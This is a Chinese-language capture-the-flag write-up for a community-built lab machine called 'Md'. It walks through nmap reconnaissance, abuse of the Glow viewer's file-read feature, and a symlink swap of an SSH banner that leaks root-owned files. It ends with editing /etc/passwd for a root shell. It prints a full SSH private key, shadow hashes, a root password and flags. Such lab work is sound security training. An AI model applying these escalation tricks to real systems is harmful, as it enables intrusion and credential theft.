---
title: "群友靶机-Md"
date: "2026-08-15"
lastmod: "2026-08-15T00:00:00+08:00"
slug: "Md_lily2663"
summary: "Md"
tags:
  - "Shell"
params:
  protected: false
  commentId: "Md_lily2663"
  legacyId: "Md_lily2663"
cover: ""
draft: false
---
# Md

# 信息搜集

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap -A 192.168.1.32
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 12:45 +0800
Nmap scan report for 192.168.1.32
Host is up (0.0028s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: Dino Game
|_http-server-header: Apache/2.4.68 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=8/14%OT=22%CT=1%CU=44475%PV=Y%DS=2%DC=T%G=Y%TM=6A7E9D6
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=21)SE
OS:Q(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=101%GCD=1%ISR=10D%TI=
OS:Z%CI=Z%II=I%TS=21)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=1
OS:07%GCD=1%ISR=108%TI=Z%CI=Z%TS=22)OPS(O1=M5B4ST11NW8%O2=M5B4ST11NW8%O3=M5
OS:B4NNT11NW8%O4=M5B4ST11NW8%O5=M5B4ST11NW8%O6=M5B4ST11)WIN(W1=FE88%W2=FE88
OS:%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW8%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=8EF7%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=8F11%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=8F
OS:1B%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=8F35%RU
OS:D=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=8F41%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT     ADDRESS
1   0.21 ms LAPTOP-L8P806AH.mshome.net (172.22.64.1)
2   1.52 ms 192.168.1.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
```

ssh提示cat/cat

![1786683022268](/assets/img/typora/1786683022268.png)

一个Glow应用

3个wp，没发现信息

那就是在glow做文章了

按e，就相当于nano，找漏洞利用点，发现ctrl+r，也就是read file

输入/etc/passwd

![1786705611620](/assets/img/typora/1786705611620.png)

文件读取成功！

/opt/a.sh

```
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEA3yWVeVQtCL+99BANbsxAaekWoijyY1cM5lkoCOtaBI9mkrMd6JHR
#Z2sb94jH+aCexZSuIm1dty6MV0GY52JFwBJfh3AU9O4vq+/z0tHfZbXRYjC72FYFfUkhRD
#Tc0NV4saYRvZLo4M81NPpcd5uXoVNhDEeA6e8DEaZmXItaQiGA/j0zYgKQcwHpwZ4fFDdj
#ytuxvbk5IVuqrSlD4hDsf9Fe3Cm52K2rhUMYIhBXDnUNqqyhKdffXXIHEVO0WC1amZerFH
#FUVsz0AW0shXZJoP+3nwK3oqsRAUoLXkEe6FXkvphVSGvRZmyWWxvOC1wMygB8ET1JAe53
#NHMVaQJlOI0XNNlPQywbhn/yL8ySE4JDWMMEehxCi4SZuE5MLUcGo6YcodbgkJrXogNhYk
#sCvd0pxGAq4hL21AiCxsgIFi0cZ704oJrJMyGE4DG06lAQ1cXbvoF3TCkqZdy3lP7Y9uoo
#IqFz3kynh/lXg53gyPNRrMMiWVVjZd4q+KGDqoszAAAFgKYQiAamEIgGAAAAB3NzaC1yc2
#EAAAGBAN8llXlULQi/vfQQDW7MQGnpFqIo8mNXDOZZKAjrWgSPZpKzHeiR0WdrG/eIx/mg
#nsWUriJtXbcujFdBmOdiRcASX4dwFPTuL6vv89LR32W10WIwu9hWBX1JIUQ03NDVeLGmEb
#2S6ODPNTT6XHebl6FTYQxHgOnvAxGmZlyLWkIhgP49M2ICkHMB6cGeHxQ3Y8rbsb25OSFb
#qq0pQ+IQ7H/RXtwpuditq4VDGCIQVw51DaqsoSnX311yBxFTtFgtWpmXqxRxVFbM9AFtLI
#V2SaD/t58Ct6KrEQFKC15BHuhV5L6YVUhr0WZsllsbzgtcDMoAfBE9SQHudzRzFWkCZTiN
#FzTZT0MsG4Z/8i/MkhOCQ1jDBHocQouEmbhOTC1HBqOmHKHW4JCa16IDYWJLAr3dKcRgKu
#IS9tQIgsbICBYtHGe9OKCayTMhhOAxtOpQENXF276Bd0wpKmXct5T+2PbqKCKhc95Mp4f5
#V4Od4MjzUazDIllVY2XeKvihg6qLMwAAAAMBAAEAAAGAIV4QMw4sam2q51x2eGtwHwYyPW
#RXE8C4FpfICJwSIAgbbp38am2nkknYwD6Cp1K70HqyQUajqAPSC4LXwj3BL/6aAfl3a2//
#I+bjyadauu2hq4edsd9HFIbDbodjFOfe6N2W3dyibb9o9YznF8w7M8NGifIFQQsy+nLXRU
#kMjEKl9HPNWP9eKecO1Rt3tUEFGe1DxPAgrrAeM6TYguzvQxED7h21LcU7wS0ZEOWVnFKn
#jQPMWPfv7XFixNYEloI4DadDABfgzP/r5iALWwilsD8WHr/0P0bW3IuagW2pGU8QNbk4nv
#/uSV1mvFXUGXDf0IaPYmzWEA/NrbExxmzJmS2Iispuaxl+z/5on/FHtekFBAQewM5eL0Wb
#M4yP2MFmTid3BSNd/8AJGBHCLYsG3j+hj8cR9nUcZex3xi/sLf18MBCKlHDmeHzmCZ2a+H
#BPbRQA5SXZLVnfyDfHsnBdHx9dSDU4HSieck0LM2XYEiVO+YpAzj2TErYkkfFaF8EZAAAA
#wDiUNR7d3DJP+ExN/rYj+kN+ila2kOxDz8LMOI4i8hnB5EvxW082wX6ZqbbwSF+KDZp6d8
#zCPTlQPGOySL7ikVotsAPKNlQsHfqxdIp+EitdKltrRzDTNU2fTsjaW/A/4rLnfvBa6v5M
#mDifFW8diY6cXh47ms1yDi0GQktpp6qoIRKRUGM/XZ0lbhUmrCZxwjTDvF4HWMcN1dgWZv
#21aw/Xwzjf1bFkhcaW4BCNeDquB/wIisnTHm+pvTqcbCZtFgAAAMEA9qsF2CjQcxBNKzU+
#Rwy9Kb4Gp6Aou7ihze++P0wUtpif0zm7zlEeYFgFOUZy6xpQOoy3GiSoEx3yRN6qVXqj8b
#yUU7fE5DTWtPbURS9BDMPec/HpFSLZwLinWd162Id0pRgAp8ngvav0ekj9aqncUgpCpepw
#LFAQBVVLw0nHj/3v/MR4IUuCejpDTbscrsWGGZBW1+lUh8aohfVsAezuti3fY8QjE6Dc/C
#V6iLqbD5aytVkfcAzZJFMNlq+2BQFZAAAAwQDnlsIQ3adPotYTEIU5LuxRYCZSyF9M2aPg
#Ri5SOkyzGrgSAdCn4z3b9OUHQqogrgbVr9h/L7ViqhK7JU4uZoEZEeMB7vB50FOEa15Vxe
#qLrVeXi839aCl1OlakVZZZrve08CcUpZaX8UFpnScLkag8br1SBMfd09vvXsfRR6MMhpE+
#AhmkYyUgdlbaa10pyIj7x+zz95ol3Gx6QfhRyG4FflT0xOHdL6TM+5HooY1ll9sXniBQEA
#qGaAvQDfi4c2sAAAAIZnRhc3lATWQBAgM=
#-----END OPENSSH PRIVATE KEY-----
```

私钥，ftasy

存到攻击机，修正权限：

```bash
chmod 600 ftasy_id
```

登陆成功：

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~/md]
└─$ ssh -i ftasy_id ftasy@192.168.1.32
=====Md======
username: cat
password: cat
   12138
=====Md======
Linux Md 7.1.5-2-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.1-7.1~trixie (2026-07-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 14 04:18:27 2026 from 192.168.1.6
ftasy@Md:~$
```

# FLAG

信息搜集

/etc/passwd中这两条指向root

```bash
root:x:0:0:root:/root:/usr/bin/glow   #正常应该是/bin/bash，和a.sh一个套路，su root会进入glow界面
ll:$1$RkFR3bF4$wusUPotchWKwj0kNEMtfF/:0:0:xxoo,,,:/root:/bin/bash   #rockyou没爆出来
```

在/var/www/html发现，

```bash
banner
ftasy@Md:/var/www/html/ftasy$ cat banner
=====Md======
username: cat
password: cat
   12138
=====Md======
ftasy@Md:/var/www/html/ftasy$
```

这个

```
=====Md======
username: cat
password: cat
   12138
=====Md======
```

就是ssh登陆时会出现的内容

看权限

```bash
ftasy@Md:/var/www/html$ ls -la
total 20
drwxr-xr-x 3 root  root  4096 Aug  2 05:10 .
drwxr-xr-x 3 root  root  4096 Aug  2 04:34 ..
drwxr-xr-x 2 ftasy ftasy 4096 Aug  2 05:14 ftasy
-rw-r--r-- 1 root  root  7950 Aug  2 04:35 index.html
ftasy@Md:/var/www/html$ cd ftasy
ftasy@Md:/var/www/html/ftasy$ ls -la
total 12
drwxr-xr-x 2 ftasy ftasy 4096 Aug  2 05:14 .
drwxr-xr-x 3 root  root  4096 Aug  2 05:10 ..
-rw-r--r-- 1 root  root    65 Aug  2 05:14 banner
```

banner是root创建，但是该目录是ftasy的，所以在该目录我可以对其删除/重命名

于是直接删了原本文件，写软连接让banner指向rootpass.txt

```bash
ftasy@Md:/var/www/html/ftasy$ rm -f /var/www/html/ftasy/banner
ftasy@Md:/var/www/html/ftasy$ ln -s /home/ftasy/rootpass.txt /var/www/html/ftasy/banner
```

再去ssh cat@192.168.1.32

```bash
┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ ssh cat@192.168.1.32
hWeKr7iFSKxioNyDfbCP
cat@192.168.1.32's password:
```

果然如此，拿到密码

但是一进去会强行被分配glow

依旧这个操作读/etc/shadow

```bash
root:$y$j9T$5BIH5Z9ecf31DCokZtATu.$6Q0ovW/DbJTzFop4XkAScJyLFHcOq60lIQ/gCwPp5X7:20667:0:99999:7:::
daemon:*:20568:0:99999:7:::
bin:*:20568:0:99999:7:::
sys:*:20568:0:99999:7:::
sync:*:20568:0:99999:7:::
games:*:20568:0:99999:7:::
man:*:20568:0:99999:7:::
lp:*:20568:0:99999:7:::
mail:*:20568:0:99999:7:::
news:*:20568:0:99999:7:::
uucp:*:20568:0:99999:7:::
proxy:*:20568:0:99999:7:::
www-data:*:20568:0:99999:7:::
backup:*:20568:0:99999:7:::
list:*:20568:0:99999:7:::
irc:*:20568:0:99999:7:::
_apt:*:20568:0:99999:7:::
nobody:*:20568:0:99999:7:::
systemd-network:!*:20568:::::1:
dhcpcd:!:20568::::::
systemd-timesync:!*:20568:::::1:
messagebus:!*:20568::::::
sshd:!*:20568::::::
ftasy:$y$j9T$XLGmHUg6BHYPEgrCyrQ1I1$O/WQiDfFh7YxMsDxcssXxXwpp3YUZ0Okql0uoXV6eOA:20667:0:99999:7:::
cat:$y$j9T$NwQgfbIDtlrleveAm1bly.$ByJ.V9/4EOlr0GmkTWiG3B9PVYwHq8IQgZ9K8wDp86A:20667:0:99999:7:::
```

同时想到可以直接读flag

```bash
ln -s /root/root.txt /var/www/html/ftasy/banner
```

```
flag{root-97050640d4163257aff17b403af3420e}
```

user应该在cat

```bash
ln -s /home/cat/user.txt /var/www/html/ftasy/banner
```

```
flag{user-bf5637273415fa1d75877a04ec6ba45f}
```

思考如何逃逸glow

# ROOT维持

```bash

Usage:
 su [options] [-] [<user> [<argument>...]]

Change the effective user ID and group ID to that of <user>.
A mere - implies -l.  If <user> is not given, root is assumed.

Options:
 -m, -p, --preserve-environment      do not reset environment variables
 -w, --whitelist-environment <list>  don't reset specified variables

 -g, --group <group>             specify the primary group
 -G, --supp-group <group>        specify a supplemental group

 -, -l, --login                  make the shell a login shell
 -c, --command <command>         pass a single command to the shell with -c
 --session-command <command>     pass a single command to the shell with -c
                                   and do not create a new session
 -f, --fast                      pass -f to the shell (for csh or tcsh)
 -s, --shell <shell>             run <shell> if /etc/shells allows it
 -P, --pty                       create a new pseudo-terminal
 -T, --no-pty                    do not create a new pseudo-terminal (bad security!)

 -h, --help                      display this help
 -V, --version                   display version

For more details see su(1).
```

![1786718413905](/assets/img/typora/1786718413905.png)

攻击机实验，当su lily2663 -c 'ls /'  ，用户名之后的参数将会被登录shell执行

当执行

```bash
ftasy@Md:/var/www/html/ftasy$ su  root  ls
Password:
Error: open ls: no such file or directory
```

于是可以想到进入/opt

```bash
su root /opt
```

将进入：

![1786716152801](/assets/img/typora/1786716152801.png)

```bash
su root -- config  #  --使得 选项解析到此为止，后面的一律当普通参数处理
```

示例：

```bash
ftasy@Md:/var/www/html/ftasy$ su root -h

Usage:
 su [options] [-] [<user> [<argument>...]]

Change the effective user ID and group ID to that of <user>.
A mere - implies -l.  If <user> is not given, root is assumed.

Options:
 -m, -p, --preserve-environment      do not reset environment variables
 -w, --whitelist-environment <list>  don't reset specified variables

 -g, --group <group>             specify the primary group
 -G, --supp-group <group>        specify a supplemental group

 -, -l, --login                  make the shell a login shell
 -c, --command <command>         pass a single command to the shell with -c
 --session-command <command>     pass a single command to the shell with -c
                                   and do not create a new session
 -f, --fast                      pass -f to the shell (for csh or tcsh)
 -s, --shell <shell>             run <shell> if /etc/shells allows it
 -P, --pty                       create a new pseudo-terminal
 -T, --no-pty                    do not create a new pseudo-terminal (bad security!)

 -h, --help                      display this help
 -V, --version                   display version

For more details see su(1).
ftasy@Md:/var/www/html/ftasy$ su root -- -h
Password:

  Render markdown on the CLI, with pizzazz!

Usage:
  glow [SOURCE|DIR] [flags]
  glow [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  config      Edit the glow config file
  help        Help about any command

Flags:
  -a, --all                  show system files and directories (TUI-mode only)
      --config string        config file (default /root/.config/glow/glow.yml)
  -h, --help                 help for glow
  -l, --line-numbers         show line numbers (TUI-mode only)
  -p, --pager                display with pager
  -n, --preserve-new-lines   preserve newlines in the output
  -s, --style string         style name or JSON path (default "auto")
  -v, --version              version for glow
  -w, --width uint           word-wrap at width (set to 0 to disable)

Use "glow [command] --help" for more information about a command.
```

su root -- config可以打开glow的配置文件：

```
/root/.config/glow/glow.yml
```

这样可以摆脱掉无文件可操作的境地：![1786716794889](/assets/img/typora/1786716794889.png)

随后^R读取/etc/passwd,修改/usr/bin/glow为/bin/bash

一路y，覆盖掉原本/etc/passwd，重新登陆，成功进入

![img](/assets/img/typora/c45b6991b1999da673c86cb7b447f356.png)

